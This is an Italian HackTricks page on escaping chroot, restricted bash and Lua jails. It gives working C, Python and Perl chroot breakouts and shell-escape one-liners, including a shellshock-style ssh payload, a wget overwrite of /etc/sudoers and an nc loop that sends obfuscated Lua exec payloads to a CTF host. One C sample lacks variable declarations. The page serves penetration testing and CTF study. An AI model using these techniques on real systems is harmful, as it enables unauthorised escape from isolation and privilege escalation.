# Uscire dalle Carceri

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Cerca in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **se puoi eseguire qualche binario con la proprietà "Shell"**

## Uscite da Chroot

Da [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Il meccanismo chroot **non è destinato a difendere** contro manomissioni intenzionali da parte di **utenti privilegiati** (**root**). Nella maggior parte dei sistemi, i contesti chroot non si sovrappongono correttamente e i programmi chrooted **con privilegi sufficienti possono eseguire un secondo chroot per uscire**.\
Di solito questo significa che per uscire devi essere root all'interno del chroot.

> [!TIP]
> Il **tool** [**chw00t**](https://github.com/earthquake/chw00t) è stato creato per abusare dei seguenti scenari e scappare da `chroot`.

### Root + CWD

> [!WARNING]
> Se sei **root** all'interno di un chroot puoi **uscire** creando **un altro chroot**. Questo perché 2 chroot non possono coesistere (in Linux), quindi se crei una cartella e poi **crei un nuovo chroot** su quella nuova cartella essendo **tu all'esterno di essa**, ora sarai **fuori dal nuovo chroot** e quindi sarai nel FS.
>
> Questo si verifica perché di solito chroot NON sposta la tua directory di lavoro in quella indicata, quindi puoi creare un chroot ma essere all'esterno di esso.

Di solito non troverai il binario `chroot` all'interno di una prigione chroot, ma **potresti compilare, caricare ed eseguire** un binario:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + fd salvato

> [!WARNING]
> Questo è simile al caso precedente, ma in questo caso l'**attaccante memorizza un descrittore di file nella directory corrente** e poi **crea il chroot in una nuova cartella**. Infine, poiché ha **accesso** a quel **FD** **al di fuori** del chroot, vi accede e **escapa**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD può essere passato attraverso Unix Domain Sockets, quindi:
>
> - Crea un processo figlio (fork)
> - Crea UDS in modo che il genitore e il figlio possano comunicare
> - Esegui chroot nel processo figlio in una cartella diversa
> - Nel processo genitore, crea un FD di una cartella che si trova al di fuori del nuovo chroot del processo figlio
> - Passa a quel processo figlio quell'FD utilizzando l'UDS
> - Il processo figlio cambia directory in quell'FD, e poiché è al di fuori del suo chroot, evaderà dalla prigione

### Root + Mount

> [!WARNING]
>
> - Montare il dispositivo root (/) in una directory all'interno del chroot
> - Chroot in quella directory
>
> Questo è possibile in Linux

### Root + /proc

> [!WARNING]
>
> - Montare procfs in una directory all'interno del chroot (se non è già stato fatto)
> - Cerca un pid che ha un'entrata root/cwd diversa, come: /proc/1/root
> - Chroot in quella voce

### Root(?) + Fork

> [!WARNING]
>
> - Crea un Fork (processo figlio) e chroot in una cartella diversa più profonda nel FS e CD su di essa
> - Dal processo genitore, sposta la cartella in cui si trova il processo figlio in una cartella precedente al chroot dei figli
> - Questo processo figlio si troverà al di fuori del chroot

### ptrace

> [!WARNING]
>
> - Tempo fa gli utenti potevano eseguire il debug dei propri processi da un processo di se stessi... ma questo non è più possibile per impostazione predefinita
> - Comunque, se è possibile, potresti ptrace in un processo ed eseguire un shellcode all'interno di esso ([vedi questo esempio](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Ottieni informazioni sulla prigione:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Modifica PATH

Controlla se puoi modificare la variabile di ambiente PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Usare vim
```bash
:set shell=/bin/sh
:shell
```
### Crea script

Controlla se puoi creare un file eseguibile con _/bin/bash_ come contenuto
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Ottieni bash da SSH

Se stai accedendo tramite ssh, puoi usare questo trucco per eseguire una shell bash:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Dichiarare
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Puoi sovrascrivere ad esempio il file sudoers.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Altri trucchi

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**Potrebbe essere interessante anche la pagina:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Carceri Python

Trucchi su come evadere dalle carceri python nella seguente pagina:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Carceri Lua

In questa pagina puoi trovare le funzioni globali a cui hai accesso all'interno di lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval con esecuzione di comandi:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Alcuni trucchi per **chiamare funzioni di una libreria senza usare i punti**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Elenca le funzioni di una libreria:
```bash
for k,v in pairs(string) do print(k,v) end
```
Nota che ogni volta che esegui il precedente one liner in un **ambiente lua diverso, l'ordine delle funzioni cambia**. Pertanto, se hai bisogno di eseguire una funzione specifica, puoi effettuare un attacco di forza bruta caricando diversi ambienti lua e chiamando la prima funzione della libreria:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Ottieni una shell lua interattiva**: Se sei all'interno di una shell lua limitata, puoi ottenere una nuova shell lua (e sperabilmente illimitata) chiamando:
```bash
debug.debug()
```
## Riferimenti

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Diapositive: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))

{{#include ../../banners/hacktricks-training.md}}
